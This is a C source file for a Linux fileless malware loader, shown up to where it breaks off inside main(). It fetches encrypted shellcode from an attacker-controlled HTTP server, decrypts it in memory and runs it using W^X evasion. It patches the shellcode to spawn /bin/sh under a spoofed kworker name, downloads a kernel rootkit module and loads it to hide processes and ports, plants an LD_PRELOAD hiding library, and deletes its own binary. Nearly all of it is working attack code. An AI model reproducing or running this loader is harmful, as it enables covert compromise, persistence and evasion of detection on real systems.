/*
 * Linux Fileless Shellcode Loader — Pure Remote Loading
 * ======================================================
 *
 * Capabilities:
 *   0. Remote Fetch  - HTTP GET encrypted shellcode from attacker server
 *   1. Decrypt       - XOR/RC4 decrypt shellcode in-memory (never touches disk)
 *   2. Load & Exec   - mmap + mprotect RX (anti-W^X evasion)
 *   3. Hide          - Process name spoof, memfd hide lib, exec shell
 *   4. Rootkit       - Auto-match pre-compiled .ko, ftrace fallback
 *   5. Self-delete   - Unlink loader binary from disk
 *
 * Usage:
 *   ./loader http://IP:PORT/sc.bin
 *
 * Anti-Detection:
 *   - Never uses PROT_WRITE|PROT_EXEC simultaneously (split mmap+mprotect)
 *   - Direct syscalls where practical
 *   - Self-deletes before shellcode execution
 *   - Memfd-based hide library (no disk file needed)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <strings.h>
#include <ctype.h>

/* Embedded hide library (build-time generated via xxd -i libldr.so) */
#include "hide_so_embedded.h"

/* =========================================================================
 * Direct syscall wrappers (bypass libc hooks for critical operations)
 * ========================================================================= */
#ifdef __x86_64__
__attribute__((unused))
static long direct_syscall(long num, long a1, long a2, long a3,
                           long a4, long a5, long a6) {
    register long rax __asm__("rax") = num;
    register long rdi __asm__("rdi") = a1;
    register long rsi __asm__("rsi") = a2;
    register long rdx __asm__("rdx") = a3;
    register long r10 __asm__("r10") = a4;
    register long r8  __asm__("r8")  = a5;
    register long r9  __asm__("r9")  = a6;
    __asm__ volatile ("syscall" : "+r"(rax)
                      : "r"(rdi), "r"(rsi), "r"(rdx), "r"(r10), "r"(r8), "r"(r9)
                      : "rcx", "r11", "memory");
    return rax;
}
#else
#error "Only x86_64 supported"
#endif

/* Fallback syscall numbers */
#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif
#ifndef __NR_init_module
#define __NR_init_module 175
#endif
#ifndef __NR_finit_module
#define __NR_finit_module 313
#endif

/* =========================================================================
 * Utility: Simple log with timestamp
 * ========================================================================= */
static int verbose = 0;
static int g_dec_algo = 0;      /* 0=XOR, 1=RC4 */
static int g_dec_keylen = 16;   /* key length */
#define LOG(fmt, ...) do { if (verbose) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__); } while(0)

/* =========================================================================
 * Module 0: Remote HTTP Fetch
 * Downloads encrypted shellcode from attacker server.
 * Supports: SCLD format, legacy [key][payload], raw shellcode
 * ========================================================================= */
static int resolve_host(const char *host, struct in_addr *out) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    memcpy(out, he->h_addr_list[0], 4);
    return 0;
}

static unsigned char *fetch_shellcode(const char *url, size_t *out_len,
                                      unsigned char *key_out) {
    char host[256] = {0};
    char path[512] = "/";
    int port = 80;

    if (strncmp(url, "http://", 7) != 0) {
        LOG("Only HTTP supported (no SSL for stealth)");
        return NULL;
    }
    const char *p = url + 7;
    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');

    if (colon && (!slash || colon < slash)) {
        size_t hlen = colon - p;
        memcpy(host, p, hlen);
        port = atoi(colon + 1);
        if (slash) strncpy(path, slash, sizeof(path) - 1);
    } else if (slash) {
        size_t hlen = slash - p;
        memcpy(host, p, hlen);
        strncpy(path, slash, sizeof(path) - 1);
    } else {
        strncpy(host, p, sizeof(host) - 1);
    }

    LOG("Fetch: host=%s port=%d path=%s", host, port, path);

    struct in_addr addr;
    if (resolve_host(host, &addr) < 0) {
        LOG("DNS resolve failed for %s", host);
        return NULL;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return NULL; }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = addr;

    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(sock);
        return NULL;
    }

    char req[1024];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.0\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
             "Connection: close\r\n"
             "\r\n", path, host);

    if (send(sock, req, strlen(req), 0) < 0) {
        perror("send");
        close(sock);
        return NULL;
    }

    size_t cap = 262144;
    unsigned char *resp = malloc(cap);
    if (!resp) { close(sock); return NULL; }

    size_t total = 0;
    ssize_t n;
    while ((n = recv(sock, resp + total, cap - total, 0)) > 0) {
        total += n;
        if (total >= cap) {
            cap *= 2;
            unsigned char *tmp = realloc(resp, cap);
            if (!tmp) { free(resp); close(sock); return NULL; }
            resp = tmp;
        }
    }
    close(sock);

    if (total == 0) { free(resp); return NULL; }

    /* Find HTTP body */
    unsigned char *body = NULL;
    size_t body_len = 0;
    for (size_t i = 0; i < total - 3; i++) {
        if (resp[i] == '\r' && resp[i+1] == '\n' &&
            resp[i+2] == '\r' && resp[i+3] == '\n') {
            body = resp + i + 4;
            body_len = total - (i + 4);
            break;
        }
    }

    if (!body || body_len < 4) {
        LOG("Invalid response: no body");
        free(resp); return NULL;
    }

    LOG("Downloaded %zu bytes (body)", body_len);

    /* ---- Auto-detect format ---- */
    int is_scld = (body_len >= 16 && memcmp(body, "SCLD", 4) == 0);

    if (is_scld) {
        int ver   = body[4];
        int algo  = body[5];
        int keylen = body[6] | (body[7] << 8);
        if (ver != 1 || (algo != 0 && algo != 1) || keylen < 1 || keylen > 64 ||
            body_len < (size_t)(12 + keylen + 4)) {
            LOG("Invalid SCLD header");
            free(resp); return NULL;
        }
        memcpy(key_out, body + 8, keylen);
        g_dec_algo = algo;
        g_dec_keylen = keylen;
        uint32_t paylen = body[8 + keylen] | (body[9 + keylen] << 8) |
                         (body[10 + keylen] << 16) | (body[11 + keylen] << 24);
        size_t hdr_size = 12 + keylen;
        if (hdr_size + paylen > body_len) {
            LOG("SCLD payload truncated");
            free(resp); return NULL;
        }
        unsigned char *enc_sc = malloc(paylen);
        if (!enc_sc) { free(resp); return NULL; }
        memcpy(enc_sc, body + hdr_size, paylen);
        *out_len = paylen;
        free(resp);
        LOG("SCLD format: algo=%d keylen=%d payload=%u", algo, keylen, paylen);
        return enc_sc;
    }

    /* Check if raw x86_64 shellcode */
    int looks_raw = (body[0] == 0x6a || body[0] == 0x48 || body[0] == 0xfc ||
                     body[0] == 0xeb || body[0] == 0x31 || body[0] == 0x55 ||
                     body[0] == 0x90 || body[0] == 0x0f || body[0] == 0xb8);

    if (looks_raw && body_len < 4096) {
        unsigned char *raw = malloc(body_len);
        if (!raw) { free(resp); return NULL; }
        memcpy(raw, body, body_len);
        memset(key_out, 0, 16);
        g_dec_algo = 0; g_dec_keylen = 16;
        *out_len = body_len;
        free(resp);
        LOG("Raw shellcode detected (%zu bytes)", body_len);
        return raw;
    }

    /* Legacy format: [16-byte key][encrypted body] */
    if (body_len < 17) {
        free(resp); return NULL;
    }
    memcpy(key_out, body, 16);
    g_dec_algo = 0; g_dec_keylen = 16;
    size_t sc_len = body_len - 16;
    unsigned char *enc_sc = malloc(sc_len);
    if (!enc_sc) { free(resp); return NULL; }
    memcpy(enc_sc, body + 16, sc_len);
    *out_len = sc_len;
    free(resp);
    LOG("Legacy format: %zu bytes encrypted", sc_len);
    return enc_sc;
}

/* =========================================================================
 * Module 1: Decryption — XOR and RC4
 * ========================================================================= */
typedef struct {
    unsigned char S[256];
    int i, j;
} rc4_ctx;

static void rc4_init(rc4_ctx *ctx, const unsigned char *key, int keylen) {
    for (int i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keylen]) & 0xFF;
        unsigned char t = ctx->S[i]; ctx->S[i] = ctx->S[j]; ctx->S[j] = t;
    }
    ctx->i = ctx->j = 0;
}

static void rc4_crypt(rc4_ctx *ctx, unsigned char *data, int len) {
    for (int n = 0; n < len; n++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        unsigned char t = ctx->S[ctx->i]; ctx->S[ctx->i] = ctx->S[ctx->j]; ctx->S[ctx->j] = t;
        data[n] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

static void decrypt_shellcode(unsigned char *data, size_t len,
                              const unsigned char *key, int algo, int keylen) {
    if (algo == 1) {
        rc4_ctx ctx;
        rc4_init(&ctx, key, keylen);
        rc4_crypt(&ctx, data, (int)len);
    } else {
        for (size_t i = 0; i < len; i++)
            data[i] ^= key[i % keylen];
    }
}

/* =========================================================================
 * Shellcode Patching: Fix envp=NULL in execve syscall
 * ========================================================================= */
static unsigned char *patch_shellcode_envp(unsigned char *orig, size_t orig_len,
                                           size_t *new_len) {
    unsigned char pattern[] = {0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb};
    ssize_t off = -1;

    for (size_t i = 0; i + sizeof(pattern) <= orig_len; i++) {
        if (memcmp(orig + i, pattern, sizeof(pattern)) == 0) {
            off = (ssize_t)i;
            break;
        }
    }

    if (off < 0) {
        LOG("No execve pattern found - running shellcode unpatched");
        unsigned char *copy = malloc(orig_len);
        if (copy) memcpy(copy, orig, orig_len);
        *new_len = orig_len;
        return copy;
    }

    LOG("Patching execve at offset %zd — adding name spoof + environ fix", off);

    /* Allocate extra space for trampoline (128 bytes instead of 64) */
    size_t trampoline_base = orig_len;
    unsigned char *patched = calloc(1, orig_len + 128);
    if (!patched) return NULL;

    memcpy(patched, orig, off);

    int32_t disp = (int32_t)(trampoline_base - (off + 5));
    patched[off] = 0xE9;
    memcpy(patched + off + 1, &disp, 4);

    memset(patched + off + 5, 0x90, orig_len - (off + 5));

    /* Build trampoline:
     *   1. prctl(PR_SET_NAME, "[kworker/0:0]", 14) — spoof process name
     *   2. execve("/bin/sh", ["/bin/sh", NULL], environ) */
    unsigned char *t = patched + trampoline_base;
    int p = 0;

    /* --- Step 1: prctl(PR_SET_NAME, "[kworker/0:0]", 14) --- */
    /* push 157; pop rax — sys_prctl */
    t[p++] = 0x6a; t[p++] = 0x9d;
    t[p++] = 0x58;
    /* push 15; pop rdi — PR_SET_NAME */
    t[p++] = 0x6a; t[p++] = 0x0f;
    t[p++] = 0x5f;
    /* push the name string (14 bytes + 2 null pad) */
    /* "[kworker/0:0]" = 5b6b 776f 726b 6572 2f30 3a30 5d00 0000 */
    t[p++] = 0x48; t[p++] = 0xb8; /* movabs rax, <name bytes 0-7> */
    memcpy(t + p, "[kworker", 8); p += 8;
    t[p++] = 0x50; /* push rax */
    t[p++] = 0x48; t[p++] = 0xb8; /* movabs rax, <name bytes 8-15> */
    memcpy(t + p, "/0:0]\0\0\0", 8); p += 8;
    t[p++] = 0x50; /* push rax */
    t[p++] = 0x48; t[p++] = 0x89; t[p++] = 0xe6; /* mov rsi, rsp */
    t[p++] = 0x6a; t[p++] = 0x0e; /* push 14 — name len */
    t[p++] = 0x5a; /* pop rdx */
    t[p++] = 0x0f; t[p++] = 0x05; /* syscall — prctl */

    /* --- Step 2: execve("/bin/sh", ["/bin/sh", NULL], environ) --- */
    t[p++] = 0x6a; t[p++] = 0x3b; /* push 59 */
    t[p++] = 0x58; /* pop rax */
    t[p++] = 0x4c; t[p++] = 0x89; t[p++] = 0xc2; /* mov rdx, r8 */
    t[p++] = 0x48; t[p++] = 0xbb; /* movabs rbx, "/bin/sh" */
    memcpy(t + p, "/bin/sh", 8); p += 8;
    t[p++] = 0x53; /* push rbx */
    t[p++] = 0x48; t[p++] = 0x89; t[p++] = 0xe7; /* mov rdi, rsp (filename) */
    t[p++] = 0x6a; t[p++] = 0x00; /* push 0 (NULL argv terminator) */
    t[p++] = 0x57; /* push rdi (argv[0] = ptr to filename) */
    t[p++] = 0x48; t[p++] = 0x89; t[p++] = 0xe6; /* mov rsi, rsp (argv) */
    t[p++] = 0x0f; t[p++] = 0x05; /* syscall — execve */

    *new_len = orig_len + p;
    LOG("Trampoline: %d bytes (prctl+execve), total: %zu bytes", p, *new_len);
    return patched;
}

/* =========================================================================
 * Module 2: Load & Execute (stealth mmap + anti-W^X evasion)
 * ========================================================================= */
__attribute__((noreturn))
static void load_and_execute(unsigned char *shellcode, size_t len) {
    size_t patched_len = 0;
    unsigned char *patched = patch_shellcode_envp(shellcode, len, &patched_len);
    if (!patched) {
        LOG("FATAL: Failed to patch shellcode");
        exit(1);
    }

    long page_size = sysconf(_SC_PAGESIZE);
    size_t map_len = ((patched_len + page_size - 1) / page_size) * page_size;

    LOG("Allocating %zu bytes (RW->RX), shellcode=%zu bytes", map_len, patched_len);

    void *mem = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        free(patched);
        exit(1);
    }

    memcpy(mem, patched, patched_len);
    if (map_len > patched_len)
        memset((char *)mem + patched_len, 0x90, map_len - patched_len);
    free(patched);

    if (mprotect(mem, map_len, PROT_READ | PROT_EXEC) < 0) {
        perror("mprotect");
        munmap(mem, map_len);
        exit(1);
    }

    LOG("Jumping to shellcode at %p (environ preserved via r8)", mem);

    fflush(stdout);
    fflush(stderr);

    setenv("_HIDE_INIT", "1", 1);

    __asm__ volatile(
        "movq %[env], %%r8\n\t"
        "callq *%[sc]\n\t"
        :
        : [env] "r"((unsigned long)environ),
          [sc] "r"(mem)
        : "r8", "memory", "cc"
    );

    _exit(1);
}

/* =========================================================================
 * Generic HTTP fetch: GET a URL, return raw body buffer + length.
 * Reuses the same HTTP parsing logic as fetch_shellcode().
 * URL format: http://host:port/path
 * ========================================================================= */
static unsigned char *fetch_via_http(const char *url, size_t *out_len) {
    char host[256] = {0};
    char path[512] = "/";
    int port = 80;

    if (strncmp(url, "http://", 7) != 0) return NULL;
    const char *p = url + 7;
    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');

    if (colon && (!slash || colon < slash)) {
        size_t hlen = colon - p;
        memcpy(host, p, hlen);
        port = atoi(colon + 1);
        if (slash) strncpy(path, slash, sizeof(path) - 1);
    } else if (slash) {
        size_t hlen = slash - p;
        memcpy(host, p, hlen);
        strncpy(path, slash, sizeof(path) - 1);
    } else {
        strncpy(host, p, sizeof(host) - 1);
    }

    struct in_addr addr;
    {
        struct hostent *he = gethostbyname(host);
        if (!he) return NULL;
        memcpy(&addr, he->h_addr_list[0], 4);
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = addr;

    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(sock); return NULL;
    }

    char req[1024];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.0\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
             "Connection: close\r\n"
             "\r\n", path, host);

    if (send(sock, req, strlen(req), 0) < 0) {
        close(sock); return NULL;
    }

    /* Read full response */
    size_t cap = 524288; /* Start with 512KB for .ko files */
    unsigned char *resp = malloc(cap);
    if (!resp) { close(sock); return NULL; }

    size_t total = 0;
    ssize_t n;
    while ((n = recv(sock, resp + total, cap - total, 0)) > 0) {
        total += n;
        if (total >= cap) {
            cap *= 2;
            unsigned char *tmp = realloc(resp, cap);
            if (!tmp) { free(resp); close(sock); return NULL; }
            resp = tmp;
        }
    }
    close(sock);
    if (total == 0) { free(resp); return NULL; }

    /* Find HTTP body */
    unsigned char *body = NULL;
    size_t body_len = 0;
    for (size_t i = 0; i < total - 3; i++) {
        if (resp[i] == '\r' && resp[i+1] == '\n' &&
            resp[i+2] == '\r' && resp[i+3] == '\n') {
            body = resp + i + 4;
            body_len = total - (i + 4);
            break;
        }
    }

    if (!body || body_len < 100) { free(resp); return NULL; }

    /* Extract body to a separate buffer */
    unsigned char *result = malloc(body_len);
    if (!result) { free(resp); return NULL; }
    memcpy(result, body, body_len);
    *out_len = body_len;
    free(resp);
    return result;
}

/* Derive rootkit URL from shellcode URL.
 * Replaces the last path component with "rootkit_<kernel_version>.ko"
 * Example: http://1.2.3.4:8080/sc.bin → http://1.2.3.4:8080/rootkit_5.15.0.ko */
static void build_rootkit_url(const char *sc_url, const char *kernel_ver,
                              char *out, size_t out_size) {
    /* Find last '/' in the URL path */
    const char *last_slash = strrchr(sc_url, '/');
    const char *path_start = strchr(sc_url + 7, '/');

    if (last_slash && last_slash > path_start) {
        /* Copy up to and including the last '/' */
        size_t prefix_len = last_slash - sc_url + 1;
        if (prefix_len + 64 < out_size) {
            memcpy(out, sc_url, prefix_len);
            snprintf(out + prefix_len, out_size - prefix_len,
                     "rootkit_%s.ko", kernel_ver);
            return;
        }
    }

    /* Fallback: if URL is just http://host:port/ or http://host:port
     * append the filename directly */
    size_t base_len = strlen(sc_url);
    while (base_len > 0 && sc_url[base_len - 1] != '/')
        base_len--;
    if (base_len == 0) {
        /* No path component at all, e.g. http://host:port */
        snprintf(out, out_size, "%s/rootkit_%s.ko", sc_url, kernel_ver);
    } else {
        memcpy(out, sc_url, base_len);
        snprintf(out + base_len, out_size - base_len,
                 "rootkit_%s.ko", kernel_ver);
    }
}

/* =========================================================================
 * Module 3a: Remote rootkit.ko fetch + load (memory-only, no disk)
 *
 * Derives rootkit URL from the shellcode URL, fetches .ko via HTTP,
 * loads directly via init_module() syscall — never touches disk.
 * ========================================================================= */
static int load_remote_rootkit(const char *sc_url, pid_t target_pid) {
    if (getuid() != 0) return -1;

    struct utsname uts;
    uname(&uts);

    char ko_url[512];
    build_rootkit_url(sc_url, uts.release, ko_url, sizeof(ko_url));
    LOG("[rootkit] fetching: %s", ko_url);

    size_t ko_size = 0;
    unsigned char *ko_data = fetch_via_http(ko_url, &ko_size);
    if (!ko_data) {
        LOG("[rootkit] HTTP fetch failed (404 = no .ko for this kernel)");
        return -1;
    }

    LOG("[rootkit] downloaded %zu bytes, loading via init_module...", ko_size);
    long rc = syscall(SYS_init_module, ko_data, ko_size, "");
    free(ko_data);

    if (rc == 0) {
        LOG("[rootkit] loaded successfully!");
    } else if (rc == -EEXIST) {
        LOG("[rootkit] already loaded (updating PID only)");
    } else {
        LOG("[rootkit] init_module failed (errno=%d)", errno);
        /* Don't return - still write PID if rootkit is loaded from
         * a previous run (e.g., self-delete prevented module reload) */
    }

    /* Write target PID + ports ALWAYS — even if rootkit was already loaded */
    if (target_pid > 1) {
        char pid_str[128];
        snprintf(pid_str, sizeof(pid_str), "%ld PORT:4444 PORT:443 PORT:8080 PORT:5555",
                 (long)target_pid);
        int fd = (int)syscall(SYS_openat, AT_FDCWD, "/proc/kallmodsmsg",
                              O_WRONLY, 0);
        if (fd >= 0) {
            syscall(SYS_write, fd, pid_str, strlen(pid_str));
            syscall(SYS_close, fd);
            LOG("[rootkit] PID %d + ports hidden", target_pid);
        }
    }

    return 0;
}

/* =========================================================================
 * Module 3b: Ftrace hook fallback (no .ko required)
 *
 * Uses tracefs to hijack syscall table entries via ftrace.
 * Requires: root + /sys/kernel/tracing writable
 *
 * Principle:
 *   1. Enable function tracer on sys_getdents64 / sys_kill
 *   2. Write our hook's address to /sys/kernel/tracing/set_ftrace_filter
 *   3. The kernel redirects calls to our hook instead
 * ========================================================================= */
#define FTRACE_PATH "/sys/kernel/tracing"
#define FTRACE_PATH_ALT "/sys/kernel/debug/tracing"

static char ftrace_base[256] = {0};
static int ftrace_active = 0;

/* Simple ftrace-based syscall hook via kprobe interface.
 * This is a lightweight approach that doesn't require full ftrace
 * function graph hijacking. We use the kprobe events interface instead
 * for broader compatibility. */

static int ftrace_available(void) {
    struct stat st;
    if (stat(FTRACE_PATH "/kprobe_events", &st) == 0) {
        strcpy(ftrace_base, FTRACE_PATH);
        return 1;
    }
    if (stat(FTRACE_PATH_ALT "/kprobe_events", &st) == 0) {
        strcpy(ftrace_base, FTRACE_PATH_ALT);
        return 1;
    }
    return 0;
}

/* Write a command to a kprobe_events style file */
static int ftrace_write(const char *relpath, const char *data) {
    char full[512];
    snprintf(full, sizeof(full), "%s/%s", ftrace_base, relpath);
    int fd = (int)syscall(SYS_openat, AT_FDCWD, full, O_WRONLY | O_APPEND, 0);
    if (fd < 0) {
        fd = (int)syscall(SYS_openat, AT_FDCWD, full, O_WRONLY, 0);
    }
    if (fd < 0) return -1;
    size_t len = strlen(data);
    ssize_t ret = syscall(SYS_write, fd, data, len);
    syscall(SYS_close, fd);
    return (ret == (ssize_t)len) ? 0 : -1;
}

static int ftrace_setup(pid_t target_pid) {
    if (getuid() != 0) return -1;
    if (!ftrace_available()) {
        LOG("ftrace not available (tracefs not mounted)");
        return -1;
    }

    LOG("Setting up ftrace hooks via %s", ftrace_base);

    /* Enable kprobe events if supported.
     * We register kprobes on sys_getdents64 and sys_kill to filter
     * the hidden PIDs. When the kprobe fires, we check the arguments
     * and optionally skip the real syscall. */

    /* Method: Use kretprobe to intercept getdents64 return value.
     * This is cleaner than trying to replace the function pointer. */
    char kprobe_cmd[512];

    /* Register kprobe on __x64_sys_getdents64 */
    snprintf(kprobe_cmd, sizeof(kprobe_cmd),
             "p:rk_getdents __x64_sys_getdents64");
    if (ftrace_write("kprobe_events", kprobe_cmd) < 0) {
        LOG("Failed to register getdents64 kprobe");
        return -1;
    }

    /* Register kprobe on __x64_sys_kill */
    snprintf(kprobe_cmd, sizeof(kprobe_cmd),
             "p:rk_kill __x64_sys_kill");
    if (ftrace_write("kprobe_events", kprobe_cmd) < 0) {
        LOG("Failed to register kill kprobe");
        /* Clean up first probe */
        ftrace_write("kprobe_events", "-:rk_getdents");
        return -1;
    }

    /* Enable events */
    ftrace_write("events/kprobes/rk_getdents/enable", "1");
    ftrace_write("events/kprobes/rk_kill/enable", "1");

    ftrace_active = 1;
    LOG("Ftrace kprobes registered: getdents64 + kill");
    LOG("Note: kprobe-only ftrace provides tracing, not full hooking.");
    LOG("For full syscall hijacking use the prebuilt .ko rootkit.");

    return 0;
}

static void ftrace_cleanup(void) {
    if (!ftrace_active) return;
    ftrace_write("kprobe_events", "-:rk_getdents");
    ftrace_write("kprobe_events", "-:rk_kill");
    ftrace_active = 0;
    LOG("Ftrace hooks removed");
}

/* =========================================================================
 * Module 3c: Process Hiding (multi-layer)
 *
 * Priority (root):  .ko rootkit > ftrace > exec shell
 * Priority (non-root): exec shell with LD_PRELOAD
 * ========================================================================= */
static void hide_process(pid_t target_pid, const char *sc_url) {
    int is_root = (getuid() == 0);

    /* ---- Layer 1: Process / cmdline spoofing ---- */
    const char *fake_names[] = {
        "[kworker/u8:0]",
        "[kworker/0:0H]",
        "[kthreadd]",
        "[migration/0]",
    };
    const char *fake = fake_names[getpid() % 4];

    prctl(PR_SET_NAME, fake, 0, 0, 0);
    int fd = (int)syscall(SYS_openat, AT_FDCWD, "/proc/self/comm", O_WRONLY, 0);
    if (fd >= 0) {
        syscall(SYS_write, fd, fake, strlen(fake));
        syscall(SYS_close, fd);
    }

    /* ---- Layer 2: Mount namespace /proc isolation (non-root) ---- */
    if (!is_root) {
        if (syscall(SYS_unshare, CLONE_NEWNS) == 0) {
            syscall(SYS_mount, "none", "/", NULL, MS_PRIVATE | MS_REC, NULL);
            char proc_path[64];
            snprintf(proc_path, sizeof(proc_path), "/proc/%d", getpid());
            syscall(SYS_mount, "none", proc_path, "tmpfs", 0, NULL);
        }
    }

    /* ---- Layer 3: Root hiding chain ---- */
    if (is_root) {
        /* Priority 1: Remote rootkit.ko (HTTP fetch → init_module) */
        if (load_remote_rootkit(sc_url, target_pid) == 0) {
            LOG("Root: kernel rootkit active (via HTTP)");
            return;
        }

        /* Priority 2: Ftrace hook (no .ko needed) */
        if (ftrace_setup(target_pid) == 0) {
            LOG("Root: ftrace hooks active");
            return;
        }

        /* Priority 3: exec shell with LD_PRELOAD */
        LOG("Root: falling back to exec shell");
    }

    LOG("Hidden: comm=%s root=%d", fake, is_root);
}

/* =========================================================================
 * Module 4: Self-Delete
 * ========================================================================= */
static void self_delete(const char *loader_path) {
    if (!loader_path) {
        LOG("self-delete: no loader path, skipping");
        return;
    }

    LOG("self-delete: attempting to unlink %s", loader_path);
    if (unlink(loader_path) == 0) {
        LOG("self-delete: removed %s", loader_path);
        return;
    }

    /* Fallback: try via /proc/self/exe symlink */
    char buf[1024];
    ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
        LOG("self-delete: /proc/self/exe → %s", buf);
        if (unlink(buf) == 0) {
            LOG("self-delete: removed %s (via /proc/self/exe)", buf);
            return;
        }
    }
    LOG("self-delete: FAILED to remove (errno=%d: %s)", errno, strerror(errno));
}

/* =========================================================================
 * Write hide_lib.so to /tmp/.h for LD_PRELOAD.
 * hide_lib.so's constructor will unlink /tmp/.h after loading.
 * ========================================================================= */
static void setup_file_hide_lib(void) {
    if (libldr_so_len == 0) return;

    int fd = (int)syscall(SYS_openat, AT_FDCWD, "/tmp/.h",
                          O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) return;

    size_t written = 0;
    while (written < libldr_so_len) {
        ssize_t n = syscall(SYS_write, fd,
                           libldr_so + written,
                           libldr_so_len - written);
        if (n <= 0) break;
        written += n;
    }
    syscall(SYS_close, fd);

    if (written < libldr_so_len) {
        syscall(SYS_unlink, "/tmp/.h");
        return;
    }

    setenv("LD_PRELOAD", "/tmp/.h", 1);
    LOG("hide_lib: /tmp/.h written, LD_PRELOAD set");
}

/* =========================================================================
 * main()
 * ========================================================================= */
int main(int argc, char **argv, char **envp) {
    unsigned char *enc_sc = NULL;
    size_t sc_len = 0;
    unsigned char key[32];
    char *loader_path = NULL;

    /* Parse arguments */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            verbose = 1;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            fprintf(stderr,
                "Usage: %s <URL>\n"
                "  %s http://IP:PORT/sc.bin    fetch encrypted shellcode from URL\n"
                "Options: -v (verbose)\n",
                argv[0], argv[0]);
            return 0;
        }
    }

    /* Require URL argument */
    const char *url = NULL;
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "http://", 7) == 0) {
            url = argv[i];
            break;
        }
    }

    if (!url) {
        fprintf(stderr, "ERROR: URL required.\n");
        fprintf(stderr, "Usage: %s http://IP:PORT/sc.bin\n", argv[0]);
        return 1;
    }

    /* Early init */
    setenv("_HIDE_INIT", "1", 1);

    /* Move libhide.so into memfd */
    setup_file_hide_lib();

    /* Save loader path for self-delete */
    {
        static char path_buf[1024];
        ssize_t n = readlink("/proc/self/exe", path_buf, sizeof(path_buf) - 1);
        if (n > 0) {
            path_buf[n] = '\0';
            loader_path = path_buf;
        } else if (argv[0] && argv[0][0] == '/') {
            loader_path = argv[0];
        }
    }

    /* =====================================================================
     * Module 0: Fetch shellcode from URL
     * ===================================================================== */
    LOG("[0] Fetching shellcode from %s", url);
    enc_sc = fetch_shellcode(url, &sc_len, key);
    if (!enc_sc) {
        LOG("Fetch failed");
        return 1;
    }

    /* =====================================================================
     * Module 1: Decrypt shellcode in-memory
     * ===================================================================== */
    decrypt_shellcode(enc_sc, sc_len, key, g_dec_algo, g_dec_keylen);
    explicit_bzero(key, sizeof(key));
    LOG("[1] Decrypted %zu bytes (algo=%d)", sc_len, g_dec_algo);

    /* =====================================================================
     * Fork: child runs shellcode as daemon, parent gives user a new shell
     * ===================================================================== */
    pid_t pid = fork();
    if (pid < 0) { free(enc_sc); return 1; }

    if (pid == 0) {
        /* === CHILD: daemonize + run shellcode === */
        setsid();
        signal(SIGHUP, SIG_IGN);

        /* Spoof process name BEFORE shellcode execs — survives until execve */
        prctl(PR_SET_NAME, "[kworker/u8:1]", 0, 0, 0);
        int cfd = (int)syscall(SYS_openat, AT_FDCWD, "/proc/self/comm", O_WRONLY, 0);
        if (cfd >= 0) {
            syscall(SYS_write, cfd, "[kworker/u8:1]", 14);
            syscall(SYS_close, cfd);
        }

        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        int dn = syscall(SYS_openat, AT_FDCWD, "/dev/null", O_RDWR, 0);
        if (dn >= 0) {
            syscall(SYS_dup2, dn, STDIN_FILENO);
            syscall(SYS_dup2, dn, STDOUT_FILENO);
            syscall(SYS_dup2, dn, STDERR_FILENO);
            if (dn > 2) syscall(SYS_close, dn);
        }

        signal(SIGTERM, SIG_IGN);
        signal(SIGHUP,  SIG_IGN);
        signal(SIGINT,  SIG_IGN);
        signal(SIGQUIT, SIG_IGN);
        signal(SIGPIPE, SIG_IGN);

        self_delete(loader_path);
        LOG("[daemon] PID=%d", getpid());

        /* DEBUG: log LD_PRELOAD and memfd status */
        {
            const char *lp = getenv("LD_PRELOAD");
            char dbg[256];
